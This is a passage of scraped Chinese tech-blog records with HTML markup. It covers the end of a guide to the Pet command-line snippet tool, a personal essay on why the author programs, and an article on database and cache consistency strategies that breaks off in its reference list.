15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npet -h\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c21659992829-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c21659992829-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127c21659992829-1\"><span class=\"crayon-v\">pet</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">h</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c21659992829-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>或者：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127c24793696701\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npet [command] -h\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c24793696701-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c24793696701-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127c24793696701-1\"><span class=\"crayon-i\">pet</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">command</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">h</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c24793696701-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这就是全部了。希望这可以帮助到你。正如你所看到的，Pet 使用相当简单易用！如果你很难记住冗长的命令，Pet 实用程序肯定会有用。</p>\n<p>干杯！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113949\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113949votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113949\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/113949/", "url_obj_id": "d60ef196f154843a4e1ea191d377a33f"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/07/b82c41ce36630a47a22e10059671eb52.jpg"], "title": "我似乎理解了编程的意义", "create_date": "2018/05/21 ·", "praise_num": 1, "fav_num": 1, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.jianshu.com/p/cb7021db2d0c\">技匠（微信公众号：techmask）</a>   </div><p>编程的意义是什么，我又为什么要编程呢？这是一个不时会浮现在我脑海中的问题，它来得并不频繁，但每次却都伴随着对自己职业生涯或人生目标的质疑而产生，令我感到些许困惑和不安。而在这十几年的职业生涯中，我也似乎总能在每个阶段为自己找到一个继续热爱编程的理由，直到它已无法解答再一次疑惑的产生。就这样一次又一次的循环往复，我似乎渐渐理解了编程的意义……</p>\n<p><img class=\"alignnone\" src=\"http://jbcdn2.b0.upaiyun.com/2016/07/b82c41ce36630a47a22e10059671eb52.jpg\" width=\"450\" height=\"307\"></p>\n<h3>编程是一项技能</h3>\n<p>回想大学毕业刚成为一名程序员时，自己对技术是如此狂热，我不断地购买各类技术书籍，几乎所有的业余时间也都被用来钻研技术，提高自己的编程能力。我也因此很快成了同一批入职新人中，编码效率和质量最突出的一个。而在那段时间里所做的技术积累，也成了我日后工作的坚实基础，编程作为一项技能已经深深地嵌入到了我的身体里。</p>\n<p>即使到了今天，我仍非常怀念那段心无旁骛，一心钻研技术的日子。我为能在工作中写出的每一行优秀代码而兴奋，更为每一天能在技术上取得的点滴进步而喜悦，一切都是那么单纯，<strong>编程的意义对于那时的我来说就在于技术本身</strong>。</p>\n<h3>编程是去解决问题</h3>\n<p>“能力越大，责任也也大”，这句电影“蜘蛛侠”中的经典台词同样适用于程序员的职业生涯。随着技术能力的提升以及工作中获得的认可，我的职位也由原来的初级程序员变为了资深开发工程师，以及后来的架构师。相应的，除了编程之外，我工作中的很大一部分时间需要用来与用户进行沟通，并分析他们提出的需求。对于我来说这个角色转换的过程，是艰难甚至有些痛苦的。 我不得不用自己最薄弱的沟通技能去和用户打交道，更要命的是我所习惯使用的那些技术语言有时很难让他们理解。</p>\n<p>我很快意识到自己已不再是那个只需被动接受任务安排，并将自己的编程工作完成好就万事大吉的初级程序员。除了技术之外，我更需要能够突破程序员思维，去发现用户需求背后所隐含的真正问题。我比以前变得更加务实，不再刻意追求技术的高深，而是尽可能从问题本身出发，选择最有效的技术手段去解决它。</p>\n<p>此时，编程的意义也发生了改变，<strong>它已不再局限于技术本身，而成了解决问题的理想工具</strong>。</p>\n<h3>编程是在表达，也是在创作</h3>\n<p>就这样又过了几年，当“为什么要编程？”这个问题再次摆在我的面前时，自己也已过了而立之年。对于大多数中国程序员来说，这个年纪已经算是高龄，甚至还有很多人会认为 30 岁还在编程，一定是混得不够好吧。当然，对于这些质疑我也总是一笑了之。其实，在此之前我也有过很多转型的机会，比如去业务部门，或是转作管理等等，但最终我还是选择留在了技术岗位上，因为我觉得编程仍是我最喜欢的，或许也是我唯一擅长的吧。</p>\n<p>而这个时期也成了我整个程序员生涯的黄金期，我写了公司的核心框架以及一些重要业务系统的核心算法。我很享受这段时光，因为我已几乎感受不到那些技术上的牵绊，我更像雕刻师使用手中的刻刀一般，自如地运用编程来实现那些我认为优秀的东西。</p>\n<p>编程对于我来说已不再是一项技能或是工具，我是在<strong>通过编程进行着自我表达与创作</strong>，这种感受带给了我极大的自由度，而我也从中感受到了前所未有的喜悦与乐趣。</p>\n<h3>编程是为了留下痕迹</h3>\n<p>最终我还是走上了管理岗位，这里面有很多个人无法左右的因素（包括大环境、家庭、经济等等）。但我仍然更乐意被大家称为程序员或者“老”程序员。就像在简书的自我介绍中，我总是把全栈工程师放在那些“头衔”的第一位，我也还在利用业余时间做自己喜欢的开源或个人项目。当我再一次问自己“为什么要编程”时，获得了与以往不一样的感悟：<strong>或许我们编程是为了能够留下一些痕迹吧</strong>。</p>\n<p>公司里最近都在为一个老系统的升级问题发愁，这个系统已经运行了将近 20 年时间了，为了升级系统，大家不得不深入到这个系统的框架中，去读底层代码。我们读到了一位已经退休的美国同事Bill所实现的数据库连接池代码。在那个时候JAVA刚开始流行，还没有像 Spring 这样的框架，或是如 Hibernate 或 MyBatis 这样标准的持久层实现，这个系统中所有的数据库连接池及核心持久层代码都是由我的这位美国同事写的，这些代码让整个系统稳定运行了将近20年，大家都不禁为他高超的技术水平发出由衷的赞叹。</p>\n<p>我还认识一位从事证券交易软件研发的公司 CTO，看年纪应该已经接近 50 了，但他仍然在亲自写着那些证券交易的核心代码。当我问他到了这个年龄和职位，为什么还要坚持写代码时，他告诉我，当他看到自己所写的代码每天在支撑着千亿级的证券交易时，他感到非常兴奋和自豪，并不断地希望能够通过自己的努力将它做得更好。</p>\n<p>我的这个美国同事不会听到大家为他十几年前所代码发出的zan叹，股民们也不会知道这位 CTO 所写的代码正在支撑着他们的日常交易。<strong>那些优秀的代码是他们留下的痕迹</strong>，我们不能确定这些痕迹能够保留多久，或许几年，或许更短，但它们都曾经在我们的日常生活中产生了重要的价值，而新的未来也将构建在这些痕迹的基础之上，我想这可能才是编程的意义所在吧。</p>\n<p>我似乎理解了编程的意义，但我明白未来的某一天，我一定还会问自己同样的问题——为什么要编程，希望到那个时候自己还能是那个热爱编程，有着一颗匠心的“技匠”吧……</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"112098\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"112098votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"112098\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,程序员,职场", "url": "http://blog.jobbole.com/112098/", "url_obj_id": "559edfe4360defce6adda9e865d11934"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/4bae6998d00f180d42c7da716e3d0bb2.jpg"], "title": "分布式之数据库和缓存双写一致性方案解析", "create_date": "2018/05/17 ·", "praise_num": 1, "fav_num": 0, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/rjzheng/p/9041659.html\">孤独烟</a>   </div><h2 id=\"引言\">引言</h2>\n<h3 id=\"为什么写这篇文章\">为什么写这篇文章？</h3>\n<p>首先，缓存由于其高并发和高性能的特性，已经在项目中被广泛使用。在读取缓存方面，大家没啥疑问，都是按照下图的流程来进行业务操作。<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/efb54ba1306999e884c5f44d35db7380.png\" alt=\"image\"><br>\n但是在更新缓存方面，对于更新完数据库，是更新缓存呢，还是删除缓存。又或者是先删除缓存，再更新数据库，其实大家存在很大的争议。目前没有一篇全面的博客，对这几种方案进行解析。于是博主战战兢兢，顶着被大家喷的风险，写了这篇文章。</p>\n<h3 id=\"文章结构\">文章结构</h3>\n<p>本文由以下三个部分组成<br>\n1、讲解缓存更新策略<br>\n2、对每种策略进行缺点分析<br>\n3、针对缺点给出改进方案</p>\n<h2 id=\"正文\">正文</h2>\n<p>先做一个说明，从理论上来说，给缓存设置过期时间，是保证最终一致性的解决方案。这种方案下，我们可以对存入缓存的数据设置过期时间，所有的写操作以数据库为准，对缓存操作只是尽最大努力即可。也就是说如果数据库写成功，缓存更新失败，那么只要到达过期时间，则后面的读请求自然会从数据库中读取新值然后回填缓存。因此，接下来讨论的思路不依赖于给缓存设置过期时间这个方案。<br>\n在这里，我们讨论<strong>三种</strong>更新策略：</p>\n<ol>\n<li>先更新数据库，再更新缓存</li>\n<li>先删除缓存，再更新数据库</li>\n<li>先更新数据库，再删除缓存</li>\n</ol>\n<p>应该没人问我，为什么没有先更新缓存，再更新数据库这种策略。</p>\n<h3 id=\"先更新数据库再更新缓存\">(1)先更新数据库，再更新缓存</h3>\n<p>这套方案，大家是普遍反对的。为什么呢？有如下两点原因。<br>\n<strong>原因一（线程安全角度）</strong><br>\n同时有请求A和请求B进行更新操作，那么会出现<br>\n（1）线程A更新了数据库<br>\n（2）线程B更新了数据库<br>\n（3）线程B更新了缓存<br>\n（4）线程A更新了缓存<br>\n这就出现请求A更新缓存应该比请求B更新缓存早才对，但是因为网络等原因，B却比A更早更新了缓存。这就导致了脏数据，因此不考虑。<br>\n<strong>原因二（业务场景角度）</strong><br>\n有如下两点：<br>\n（1）如果你是一个写数据库场景比较多，而读数据场景比较少的业务需求，采用这种方案就会导致，数据压根还没读到，缓存就被频繁的更新，浪费性能。<br>\n（2）如果你写入数据库的值，并不是直接写入缓存的，而是要经过一系列复杂的计算再写入缓存。那么，每次写入数据库后，都再次计算写入缓存的值，无疑是浪费性能的。显然，删除缓存更为适合。</p>\n<p>接下来讨论的就是争议最大的，先删缓存，再更新数据库。还是先更新数据库，再删缓存的问题。</p>\n<h3 id=\"先删缓存再更新数据库\">(2)先删缓存，再更新数据库</h3>\n<p>该方案会导致不一致的原因是。同时有一个请求A进行更新操作，另一个请求B进行查询操作。那么会出现如下情形:<br>\n（1）请求A进行写操作，删除缓存<br>\n（2）请求B查询发现缓存不存在<br>\n（3）请求B去数据库查询得到旧值<br>\n（4）请求B将旧值写入缓存<br>\n（5）请求A将新值写入数据库<br>\n上述情况就会导致不一致的情形出现。而且，如果不采用给缓存设置过期时间策略，该数据永远都是脏数据。<br>\n那么，<strong>如何解决呢？采用延时双删策略</strong><br>\n伪代码如下</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a8b221b391399262817\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic void write(String key,Object data){\r\n        redis.delKey(key);\r\n        db.updateData(data);\r\n        Thread.sleep(1000);\r\n        redis.delKey(key);\r\n    }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a8b221b391399262817-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a8b221b391399262817-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a8b221b391399262817-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a8b221b391399262817-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a8b221b391399262817-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a8b221b391399262817-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a8b221b391399262817-1\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">write</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">Object</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a8b221b391399262817-2\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">delKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a8b221b391399262817-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">db</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">updateData</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a8b221b391399262817-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">Thread</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a8b221b391399262817-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">delKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a8b221b391399262817-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n\n</div>\n<p>转化为中文描述就是<br>\n（1）先淘汰缓存<br>\n（2）再写数据库（这两步和原来一样）<br>\n（3）休眠1秒，再次淘汰缓存<br>\n这么做，可以将1秒内所造成的缓存脏数据，再次删除。<br>\n<strong>那么，这个1秒怎么确定的，具体该休眠多久呢？</strong><br>\n针对上面的情形，读者应该自行评估自己的项目的读数据业务逻辑的耗时。然后写数据的休眠时间则在读数据业务逻辑的耗时基础上，加几百ms即可。这么做的目的，就是确保读请求结束，写请求可以删除读请求造成的缓存脏数据。<br>\n<strong>如果你用了mysql的读写分离架构怎么办？</strong><br>\nok，在这种情况下，造成数据不一致的原因如下，还是两个请求，一个请求A进行更新操作，另一个请求B进行查询操作。<br>\n（1）请求A进行写操作，删除缓存<br>\n（2）请求A将数据写入数据库了，<br>\n（3）请求B查询缓存发现，缓存没有值<br>\n（4）请求B去从库查询，这时，还没有完成主从同步，因此查询到的是旧值<br>\n（5）请求B将旧值写入缓存<br>\n（6）数据库完成主从同步，从库变为新值<br>\n上述情形，就是数据不一致的原因。还是使用双删延时策略。只是，睡眠时间修改为在主从同步的延时时间基础上，加几百ms。<br>\n<strong>采用这种同步淘汰策略，吞吐量降低怎么办？</strong><br>\nok，那就将第二次删除作为异步的。自己起一个线程，异步删除。这样，写的请求就不用沉睡一段时间后了，再返回。这么做，加大吞吐量。<br>\n<strong>第二次删除,如果删除失败怎么办？</strong><br>\n这是个非常好的问题，因为第二次删除失败，就会出现如下情形。还是有两个请求，一个请求A进行更新操作，另一个请求B进行查询操作，为了方便，假设是单库：<br>\n（1）请求A进行写操作，删除缓存<br>\n（2）请求B查询发现缓存不存在<br>\n（3）请求B去数据库查询得到旧值<br>\n（4）请求B将旧值写入缓存<br>\n（5）请求A将新值写入数据库<br>\n（6）请求A试图去删除请求B写入对缓存值，结果失败了。<br>\nok,这也就是说。如果第二次删除缓存失败，会再次出现缓存和数据库不一致的问题。<br>\n<strong>如何解决呢？</strong><br>\n具体解决方案，且看博主对第(3)种更新策略的解析。</p>\n<h3 id=\"先更新数据库再删缓存\">(3)先更新数据库，再删缓存</h3>\n<p>首先，先说一下。老外提出了一个缓存更新套路，名为<a href=\"https://docs.microsoft.com/en-us/azure/architecture/patterns/cache-aside\">《Cache-Aside pattern》</a>。其中就指出</p>\n<ul>\n<li><strong>失效</strong>：应用程序先从cache取数据，没有得到，则从数据库中取数据，成功后，放到缓存中。</li>\n<li><strong>命中</strong>：应用程序从cache中取数据，取到后返回。</li>\n<li><strong>更新</strong>：先把数据存到数据库中，成功后，再让缓存失效。</li>\n</ul>\n<p>另外，知名社交网站facebook也在论文<a href=\"https://www.usenix.org/system/files/conference/nsdi13/nsdi13-final170_update.pdf\">《Scaling Memcache at Facebook》</a>中提出，他们用的也是先更新数据库，再删缓存的策略。<br>\n<strong>这种情况不存在并发问题么？</strong><br>\n不是的。假设这会有两个请求，一个请求A做查询操作，一个请求B做更新操作，那么会有如下情形产生<br>\n（1）缓存刚好失效<br>\n（2）请求A查询数据库，得一个旧值<br>\n（3）请求B将新值写入数据库<br>\n（4）请求B删除缓存<br>\n（5）请求A将查到的旧值写入缓存<br>\nok，如果发生上述情况，确实是会发生脏数据。<br>\n<strong>然而，发生这种情况的概率又有多少呢？</strong><br>\n发生上述情况有一个先天性条件，就是步骤（3）的写数据库操作比步骤（2）的读数据库操作耗时更短，才有可能使得步骤（4）先于步骤（5）。可是，大家想想，数据库的读操作的速度远快于写操作的（不然做读写分离干嘛，做读写分离的意义就是因为读操作比较快，耗资源少），因此步骤（3）耗时比步骤（2）更短，这一情形很难出现。<br>\n假设，有人非要抬杠，有强迫症，一定要解决怎么办？<br>\n<strong>如何解决上述并发问题？</strong><br>\n首先，给缓存设有效时间是一种方案。其次，采用策略（2）里给出的异步延时删除策略，保证读请求完成以后，再进行删除操作。<br>\n<strong>还有其他造成不一致的原因么？</strong><br>\n有的，这也是缓存更新策略（2）和缓存更新策略（3）都存在的一个问题，如果删缓存失败了怎么办，那不是会有不一致的情况出现么。比如一个写数据请求，然后写入数据库了，删缓存失败了，这会就出现不一致的情况了。这也是缓存更新策略（2）里留下的最后一个疑问。<br>\n<strong>如何解决？</strong><br>\n提供一个保障的重试机制即可，这里给出两套方案。<br>\n<strong>方案一</strong>：<br>\n如下图所示<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/e74363356412a2063817224f814e7972.png\" alt=\"image\"><br>\n流程如下所示<br>\n（1）更新数据库数据；<br>\n（2）缓存因为种种问题删除失败<br>\n（3）将需要删除的key发送至消息队列<br>\n（4）自己消费消息，获得需要删除的key<br>\n（5）继续重试删除操作，直到成功<br>\n然而，该方案有一个缺点，对业务线代码造成大量的侵入。于是有了方案二，在方案二中，启动一个订阅程序去订阅数据库的binlog，获得需要操作的数据。在应用程序中，另起一段程序，获得这个订阅程序传来的信息，进行删除缓存操作。<br>\n<strong>方案二</strong>：<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/771c3424c83f1059ce967f769dea20ae.png\" alt=\"image\"><br>\n流程如下图所示：<br>\n（1）更新数据库数据<br>\n（2）数据库会将操作信息写入binlog日志当中<br>\n（3）订阅程序提取出所需要的数据以及key<br>\n（4）另起一段非业务代码，获得该信息<br>\n（5）尝试删除缓存操作，发现删除失败<br>\n（6）将这些信息发送至消息队列<br>\n（7）重新从消息队列中获得该数据，重试操作。</p>\n<p><strong>备注说明：</strong>上述的订阅binlog程序在mysql中有现成的中间件叫canal，可以完成订阅binlog日志的功能。至于oracle中，博主目前不知道有没有现成中间件可以使用。另外，重试机制，博主是采用的是消息队列的方式。如果对一致性要求不是很高，直接在程序中另起一个线程，每隔一段时间去重试即可，这些大家可以灵活自由发挥，只是提供一个思路。</p>\n<h2 id=\"总结\">总结</h2>\n<p>本文其实是对目前互联网中已有的一致性方案，进行了一个总结。对于先删缓存，再更新数据库的更新策略，还有方案提出维护一个内存队列的方式，博主看了一下，觉得实现异常复杂，没有必要，因此没有必要在文中给出。最后，希望大家有所收获。</p>\n<h2 id=\"参考文献\">参考文献</h2>\n<p>1、<a href=\"https://mp.weixin.qq.com/s?__biz=MjM5ODYxMDA5OQ==&amp;mid=404308725&amp;idx=1&amp;sn=1a25ce76dd1956014ceb8a011855268e&amp;scene=21#wechat_redirect\">主从DB与cache一致性</a><br>\n2、<a 